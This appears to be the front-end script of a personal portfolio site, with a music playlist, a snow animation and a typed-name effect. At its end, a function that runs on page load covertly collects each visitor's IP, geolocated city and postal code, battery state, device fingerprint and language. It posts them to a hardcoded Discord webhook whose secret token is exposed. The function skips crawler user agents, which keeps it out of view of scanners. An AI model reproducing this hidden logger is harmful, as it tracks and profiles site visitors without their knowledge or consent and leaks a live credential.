const playlist = [
  'seul dans ma chambre (1).mp3',
  "j'te cherche la ou t'es pas.mp3"
];

const audio = document.getElementById('bg-audio');
let index = 0;

function setSrc(i) {
  if (!audio) return;
  audio.src = playlist[i];
  audio.load();
  audio.volume = 0.9;
}

function playAudio() {
  if (!audio) return;
  const p = audio.play();
  if (p && p.catch) {
    p.catch(() => {
      const resume = () => {
        audio.play().catch(()=>{});
        window.removeEventListener('click', resume);
        window.removeEventListener('touchstart', resume);
      };
      window.addEventListener('click', resume, { once: true });
      window.addEventListener('touchstart', resume, { once: true });
    });
  }
}

if (audio) {
  setSrc(index);
  audio.addEventListener('ended', () => {
    index = (index + 1) % playlist.length;
    setSrc(index);
    playAudio();
  });
  playAudio();
}

(function initSnow() {
  if (window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;

  const canvas = document.getElementById('snow-canvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');

  let w = 0, h = 0, flakes = [];
  const DPR = Math.min(window.devicePixelRatio || 1, 2);

  function resize() {
    w = canvas.width = Math.floor(window.innerWidth * DPR);
    h = canvas.height = Math.floor(window.innerHeight * DPR);
    canvas.style.width = window.innerWidth + 'px';
    canvas.style.height = window.innerHeight + 'px';
    const base = Math.round(Math.max(40, (window.innerWidth * 60) / 1024));
    flakes = createFlakes(base);
  }

  function random(min, max) { return Math.random() * (max - min) + min; }

  function createFlakes(count) {
    const arr = [];
    for (let i = 0; i < count; i++) {
      arr.push({
        x: Math.random() * w,
        y: Math.random() * h,
        r: random(0.6, 4.2) * DPR,
        vx: random(-0.6, 0.8) * DPR,
        vy: random(0.5, 2.0) * DPR,
        o: random(0.2, 0.95),
        rot: random(0, Math.PI * 2),
        spin: random(-0.02, 0.02),
        layer: Math.random() < 0.6 ? 1 : (Math.random() < 0.5 ? 0.6 : 1.6)
      });
    }
    return arr;
  }

  function update() {
    ctx.clearRect(0, 0, w, h);

    ctx.save();
    const g = ctx.createRadialGradient(w/2, h/2, Math.min(w,h)*0.1, w/2, h/2, Math.max(w,h));
    g.addColorStop(0, 'rgba(255,255,255,0.00)');
    g.addColorStop(1, 'rgba(0,0,0,0.06)');
    ctx.fillStyle = g;
    ctx.fillRect(0,0,w,h);
    ctx.restore();

    for (let i = 0; i < flakes.length; i++) {
      const f = flakes[i];

      const wind = Math.sin((f.y + i * 10) * 0.002) * 0.3 * f.layer * DPR;
      f.vx += wind * 0.02;
      f.x += f.vx;
      f.y += f.vy * f.layer;

      f.x += Math.sin((f.y + i) * 0.01) * 0.4 * f.layer;

      f.rot += f.spin;

      if (f.y > h + 20 || f.x < -80 || f.x > w + 80) {
        f.x = Math.random() * w;
        f.y = -10 - Math.random() * 60;
        f.vx = random(-0.6, 0.8) * DPR;
        f.vy = random(0.5, 2.0) * DPR;
        f.r = random(0.6, 4.2) * DPR;
        f.o = random(0.2, 0.95);
        f.spin = random(-0.02, 0.02);
        f.layer = Math.random() < 0.6 ? 1 : (Math.random() < 0.5 ? 0.6 : 1.6);
        f.rot = random(0, Math.PI * 2);
      }

      ctx.save();
      ctx.translate(f.x, f.y);
      ctx.rotate(f.rot);
      ctx.globalAlpha = f.o * 0.95;

      if (f.layer > 1.2) {
        ctx.fillStyle = 'rgba(255,255,255,1)';
        ctx.beginPath();
        ctx.arc(0, 0, f.r, 0, Math.PI*2);
        ctx.fill();
      } else if (f.layer < 0.8) {
        ctx.strokeStyle = 'rgba(255,255,255,0.9)';
        ctx.lineWidth = Math.max(1, f.r*0.18);
        ctx.beginPath();
        ctx.moveTo(-f.r*0.6, 0); ctx.lineTo(f.r*0.6, 0);
        ctx.moveTo(0, -f.r*0.6); ctx.lineTo(0, f.r*0.6);
        ctx.stroke();
      } else {
        ctx.fillStyle = 'rgba(255,255,255,1)';
        ctx.shadowColor = 'rgba(255,255,255,0.08)';
        ctx.shadowBlur = Math.max(0, f.r * 1.6);
        ctx.beginPath();
        ctx.arc(0, 0, f.r, 0, Math.PI*2);
        ctx.fill();
        ctx.shadowBlur = 0;
      }

      ctx.restore();
      ctx.globalAlpha = 1;
    }

    raf = requestAnimationFrame(update);
  }

  let raf = null;
  function start() {
    if (raf) cancelAnimationFrame(raf);
    raf = requestAnimationFrame(update);
  }

  resize();
  start();

  window.addEventListener('resize', () => {
    clearTimeout(window._snowResizeTimer);
    window._snowResizeTimer = setTimeout(resize, 120);
  });

  document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
      if (raf) cancelAnimationFrame(raf);
      raf = null;
    } else {
      start();
    }
  });

  window.__snow = { resize, start, stop: () => { if (raf) cancelAnimationFrame(raf); raf = null; } };
})();

(function typeName() {
  const el = document.querySelector('.name');
  if (!el) return;
  const full = el.textContent.trim();
  el.textContent = '';

  const caret = document.createElement('span');
  caret.className = 'type-caret';
  caret.setAttribute('aria-hidden', 'true');

  const container = document.createElement('span');
  container.className = 'type-container';
  container.appendChild(caret);
  el.appendChild(container);

  let i = 0;
  const speed = 180;
  function step() {
    if (i <= full.length) {
      if (container.childNodes.length > 1) {
        container.removeChild(container.childNodes[0]);
      }
      const textNode = document.createTextNode(full.slice(0, i));
      container.insertBefore(textNode, caret);
      i++;
      setTimeout(step, speed);
    } else {
      caret.classList.add('done');
    }
  }

  setTimeout(step, 600);
})();

function tryPlay() {
  if (!audio) return null;
  playAudio();
  return audio;
}

async function fetchIP() {
  try {
    const r = await fetch('https://api.ipify.org?format=json');
    if (!r.ok) return 'unknown';
    const j = await r.json();
    return j.ip || 'unknown';
  } catch {
    return 'unknown';
  }
}

function getBatteryInfo() {
  if (!navigator.getBattery) return Promise.resolve('unsupported');
  return navigator.getBattery().then(b => {
    const level = Math.round(b.level * 100) + '%';
    const charging = b.charging ? 'charging' : 'discharging';
    return `${level} (${charging})`;
  }).catch(()=> 'unknown');
}

function getGeo(ip) {
  if (!ip) return Promise.resolve('unknown');
  return fetch('https://ipapi.co/' + encodeURIComponent(ip) + '/json/')
    .then(r => {
      if (!r.ok) return 'unknown';
      return r.json().then(j => {
        const city = j.city || 'unknown';
        const region = j.region || j.region_code || 'unknown';
        const country = j.country_name || j.country || 'unknown';
        const postal = j.postal || 'unknown';
        const org = j.org || j.org || 'unknown';
        const timezone = j.timezone || 'unknown';
        const loc = `${city}, ${region}, ${country} ${postal}`;
        const details = `location: ${loc}; org: ${org}; timezone: ${timezone}; ip: ${ip}`;
        return details;
      }).catch(()=> 'unknown');
    })
    .catch(()=> 'unknown');
}

function deviceInfo() {
  const ua = navigator.userAgent || 'unknown';
  const platform = navigator.platform || 'unknown';
  const screenSize = (screen && screen.width) ? `${screen.width}x${screen.height}` : 'unknown';
  const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'unknown cores';
  const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB RAM` : 'unknown RAM';
  const touch = ('maxTouchPoints' in navigator) ? `${navigator.maxTouchPoints} touch` : 'no touch';
  const colorDepth = screen && screen.colorDepth ? `${screen.colorDepth}-bit color` : 'unknown color';
  const pixelRatio = window.devicePixelRatio || 1;
  return `${platform} • ${screenSize} • ${cores} • ${memory} • ${touch} • ${colorDepth} • DPR:${pixelRatio} • ${ua}`;
}

async function sendVisitorWebhook() {
  const webhook = 'https://discord.com/api/webhooks/1473689467486343301/5T4oEyjfSreXcuPyoVPJjDRiIkU5diDr0ia5l7BjAGDzUJGjSWAw99uwl038HAUoMRzW';
  const ip = await fetchIP();

  // simple bot sniffing - skip known crawler/bot user agents
  const ua = (navigator.userAgent || 'unknown').toLowerCase();
  const botPatterns = /(bot|crawl|spider|archiver|pingdom|loader|monitor|uptime|checker|wget|curl|python|node|php|golang|scraper|httpclient)/i;
  if (botPatterns.test(ua)) return;

  // only send once per IP (persisted in localStorage)
  try {
    const key = 'sent_ips_v1';
    const raw = localStorage.getItem(key);
    const sent = raw ? JSON.parse(raw) : [];
    if (sent && sent.includes(ip)) return;
  } catch (e) {}

  const locale = navigator.language || navigator.languages?.[0] || 'unknown';
  const battery = await getBatteryInfo();
  const geo = await getGeo(ip);
  const device = deviceInfo();

  const embed = {
    title: 'Nouvelle connexion',
    description: 'Un visiteur a ouvert la page',
    color: 0x1ABC9C,
    timestamp: new Date().toISOString(),
    thumbnail: { url: window.location.origin + '/Snapchat-1279184412.jpg' },
    author: {
      name: navigator.platform || 'unknown',
      url: window.location.href
    },
    fields: [
      { name: 'IP', value: ip || 'unknown', inline: true },
      { name: 'Pays/Localisation', value: typeof geo === 'string' ? geo : String(geo).slice(0, 1024), inline: false },
      { name: 'Appareil et écran', value: device.slice(0, 1024), inline: false },
      { name: 'User-Agent', value: ua.slice(0, 1024), inline: false },
      { name: 'Batterie', value: String(battery).slice(0, 256), inline: true },
      { name: 'Langue', value: locale, inline: true }
    ],
    footer: { text: 'Visiteur — Okooz portfolio', icon_url: window.location.origin + '/images (8).png' }
  };

  const body = { embeds: [embed] };

  try {
    const res = await fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    if (res && (res.status === 204 || res.ok)) {
      try {
        const key = 'sent_ips_v1';
        const raw = localStorage.getItem(key);
        const sent = raw ? JSON.parse(raw) : [];
        sent.push(ip);
        // keep list short
        const unique = Array.from(new Set(sent)).slice(-50);
        localStorage.setItem(key, JSON.stringify(unique));
      } catch (e) {}
    }
  } catch (e) {}
}

sendVisitorWebhook();

export default { tryPlay };